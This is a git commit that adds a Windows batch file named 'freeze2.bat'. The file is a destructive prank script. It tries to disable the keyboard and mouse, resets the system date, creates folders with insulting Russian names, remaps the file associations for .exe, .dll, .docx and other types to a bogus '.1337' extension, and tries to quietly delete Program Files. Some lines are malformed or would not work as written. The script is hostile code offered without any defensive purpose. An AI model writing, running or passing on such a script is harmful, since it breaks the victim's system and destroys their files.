3002689752e9bf5b54fce09527cf1f9be95cba4d
Oxide Dev <59166229+OxideDevX@users.noreply.github.com>
2021-07-17 13:40:19 +0300

    Create freeze2.bat

---
+++ freeze2.bat
@@ -0,0 +1,19 @@
+@echo off
+rundll32 keyboard,disable 
+rundll32 mouse,disable 
+date 12.12.2012
+md PRIDUROK
+md LUZER
+md DURAK
+md LAMER
+md DIBIL
+assoc .exe=.1337
+assoc .iso=.1337
+assoc .dat=.1337
+assoc .ico=.1337
+assoc .dll=.1337
+assoc .docx=.1337
+assoc .mbr=.1337
+assoc .bin=.1337
+del c:Program Files/q
+tree
